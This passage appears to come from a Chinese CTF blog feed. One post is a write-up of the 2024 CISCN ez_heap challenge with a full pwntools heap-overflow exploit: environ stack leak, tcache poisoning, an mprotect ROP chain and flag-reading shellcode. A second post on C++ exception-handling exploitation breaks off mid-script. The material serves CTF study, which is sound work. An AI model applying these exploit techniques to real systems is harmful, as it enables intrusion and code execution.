        <content type="html"><![CDATA[<h1 id="pwn-environ打栈学习"><a href="#pwn-environ打栈学习" class="headerlink" title="pwn-environ打栈学习"></a>pwn-environ打栈学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早前就了解过这个打法了，但是一直没尝试过，今天试着做了一道<strong>2024ciscn ez_heap</strong>来尝试一下environ打栈，其实很简单，environ在libc中，储存着一个栈地址，而这个栈地址与函数栈帧之间的偏移是固定的，通过泄露environ，就可以在堆题中实现对栈的攻击，但其实都能把chunk劫持到栈上进行篡改数据的话，直接修改IO结构体，打IO也是可行的，这里尝试了一下打栈</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目漏洞很简单，比如在add里申请一个0x100的chunk，但是在edit里对这个chunk的修改的size由自己定，且没有上限，你可以修改0x200,0x300甚至更大，很明显的堆溢出，之后泄露heap,泄露libc,泄露stack,然后将chunk劫持到栈上修改ret，控制执行流，就可以了，哦对，这个题开启了沙箱，可以用mprotect修改一个页的权限，然后写进去shellcode，也可以直接用rop链，都是可行的，我这边用的mprotect，记得调用mprotect时修改权限的地址要页对齐噢~~</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./EzHeap&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">key=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">heap_base=key&lt;&lt;<span class="number">12</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x230</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x21ace0</span></span><br><span class="line">environ=li(<span class="number">0x222200</span>)</span><br><span class="line">ogg1=li(<span class="number">0xebc81</span>)</span><br><span class="line">ogg2=li(<span class="number">0xebc85</span>)</span><br><span class="line">ogg3=li(<span class="number">0xebc88</span>)</span><br><span class="line">ogg4=li(<span class="number">0xebce2</span>)</span><br><span class="line">ogg5=li(<span class="number">0xebd38</span>)</span><br><span class="line">ogg6=li(<span class="number">0xebd3f</span>)</span><br><span class="line">ogg7=li(<span class="number">0xebd43</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f2e7</span>)</span><br><span class="line">mprotect=lis(<span class="string">b&#x27;mprotect&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x461</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x248</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x230</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64((environ-<span class="number">0x210</span>)^key))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack=l64()</span><br><span class="line">shellcode=asm(</span><br><span class="line">    <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        lea rdi,[rip]</span></span><br><span class="line"><span class="string">        add rdi,0x139</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        lea rsi,[rsp+0x30]</span></span><br><span class="line"><span class="string">        mov rdx, 0x30</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rdx,0x30</span></span><br><span class="line"><span class="string">        mov rax,1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc0</span>+shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64((stack-<span class="number">0x170</span>-<span class="number">8</span>)^(key+<span class="number">1</span>)))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi)+p64(he(<span class="number">0x2000</span>))+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(he(<span class="number">0x2000</span>)))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> environ打栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-c++异常处理利用</title>
      <link href="/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/"/>
      <url>/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-C-异常处理利用"><a href="#pwn-C-异常处理利用" class="headerlink" title="pwn-C++异常处理利用"></a>pwn-C++异常处理利用</h1><h2 id="前置准备（如何更换一个c-编译而成的程序的依赖库）"><a href="#前置准备（如何更换一个c-编译而成的程序的依赖库）" class="headerlink" title="前置准备（如何更换一个c++编译而成的程序的依赖库）"></a>前置准备（如何更换一个c++编译而成的程序的依赖库）</h2><p>一个题目如果需要用到libc的话，其他依赖库可能不会给你，但一般都会给libc，告诉是哪个版本的，我们需要获取对应版本的其他依赖库，这里给出的方法是从docker中拷贝</p><p>1.执行如下命令创建对应版本的docker，获取对应版本的依赖库，这条命令创建的是22.04的docker，扒的是2.35的libc，根据自己的需要更换版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:22.04 /bin/bash</span><br></pre></td></tr></table></figure><p>2.进入dorker后，这个版本对应的所有依赖库一般在<strong>/usr/lib/x86_64-linux-gnu</strong>目录下，通过<strong>ls</strong>命令可以查看到所有的依赖库（我的是这样的），然后通过docker的命令将自己所需要的依赖库拷贝到本地即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> your_docker_id://usr/lib/x86_64-linux-gnu/libc path/to/your_desktop</span><br><span class="line"><span class="comment">#你的docker_id可以通过docker ps查看</span></span><br><span class="line"><span class="comment">#在/usr/lib/x86_64-linux-gnu下的libstdc++.so.6和libseccomp.so.2是软链接，应该拷贝的是形如libseccomp.so.2.5.0或者是libstdc++.so.6.30这样的elf文件，而不是软链接（文件名可能写的不是很准确，知道意思就好）</span></span><br></pre></td></tr></table></figure><p>3.通过patchelf更换一个文件的对应的依赖库，这个就不赘述了，主要就是通过这些命令替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn</span><br></pre></td></tr></table></figure><p>这里有个坑需要注意，困扰了我好长时间，我在更换<strong>libm.so.6</strong>的时候一直不成功，这是因为文件是通过<strong>libstdc++.so.6</strong>来连接<strong>libm.so.6</strong>的，需要更换<strong>libstdc++.so.6</strong>的依赖库，才可以修改成功</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20230730.png" alt="屏幕截图 2025-07-30 230730"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed ./libm.so.6 ./libm.so.6 libstdc++.so.6</span><br></pre></td></tr></table></figure><p>这样就可以正确的更换所需的配套的依赖库了</p><h2 id="C-异常处理分析"><a href="#C-异常处理分析" class="headerlink" title="C++异常处理分析"></a>C++异常处理分析</h2><p>具体详细分析和讲解这里就不再说明了，大家可以参考这些大佬写的文章，很详细，<a href="https://zhuanlan.zhihu.com/p/13157062538">文章1</a>，<a href="https://zp9080.github.io/post/c++-pwn/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">文章2</a></p><p>这里主要说以下我调试过程中的一些体会</p><p>1.try模块和catch模块是不会在ida里以伪代码的形式呈现的，需要在汇编指令窗口查看</p><p>2.当程序执行到<strong>__cxa_throw</strong>函数时，在这个函数里会调用<strong>_Unwind_RaiseException</strong>进行栈回退，并在<strong>_Unwind_RaiseException+463</strong>的地方查看目前回退到的这个函数栈帧是否存在catch模块可以捕获异常，如果存在，便会执行catch模块中的代码，否则会<strong>terminate</strong>强制程序终止</p><p>3.虽然编写C++代码时一个try对应的一个catch，正常情况栈回退会找到与之对应的catch模块，但是我们可以攻击栈回退时依赖的ret地址，使抛出的异常被其他try对应的catch捕获，这样就可以执行其他catch中的代码了，如果正好是后门函数，那就可以直接get_shell了</p><p>4.要想让throw抛出的错误被一个catch捕获，栈回退中的ret的地址必须是你想要执行的catch代码对应的try模块中的汇编指令或者是其仅挨着的下一条汇编指令，才能正确catch异常并执行catch模块中的代码</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20234009.png" alt="屏幕截图 2025-07-30 234009"></p><p>比如上图中的try模块，要想catch后执行和这个try对应的catch中的的代码，你的ret地址必须是0x401eea~0x401f0b(0x401eea可能不行，没试过)，但是如果超过了0x401f0b，就不会正确执行到catch中的代码，而是会执行<strong>terminate</strong>，ret的地址你可以在执行到<strong>_Unwind_RaiseException+463</strong>的时候查看，在rdx寄存器里</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20234837.png" alt="屏幕截图 2025-07-30 234837"></p><p>像此时，程序执行到了_Unwind_RaiseException+463，而rdx里的值是0x401efc,显然在上图的范围内，这就说明这已经是最后_Unwind_RaiseException进行的最后一次栈回退了，这次回退过后就可以找到catch模块，然后去执行catch里的代码了</p><p>5.在进入<strong>__cxa_throw</strong>前的函数栈帧的rbp和ret的地址该覆盖为什么值，该怎么选择呢？</p><p>可以看到在进入__cxa_throw之前，rbp里储存的值是0x405460,而ret里储存的值是0x401ed9</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20235620.png" alt="屏幕截图 2025-07-30 235620"></p><p>可以看到在Unwind_RaiseException执行完后rbp的值就变成了0x405460，而下一条指令执行的值0x401f19是0x401ed9对应的catch模块里的代码，通过这个关系，应该就可以按照自己的思路来布置自己的payload来覆盖rbp和ret了</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20235729.png" alt="屏幕截图 2025-07-30 235729"></p><h2 id="Nepnep2025-canutrytry"><a href="#Nepnep2025-canutrytry" class="headerlink" title="Nepnep2025 canutrytry"></a>Nepnep2025 canutrytry</h2><p>笔者太懒了，不想分析题目讲解exp了，这里放一遍大佬的wp大家参考吧，<a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">文章链接</a>，相信通过上述的分析，一步一步调试exp，可以调懂的</p><p><del>原谅我折磨懒qaq</del></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_1</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_2</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_3</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">libc=ELF(<span 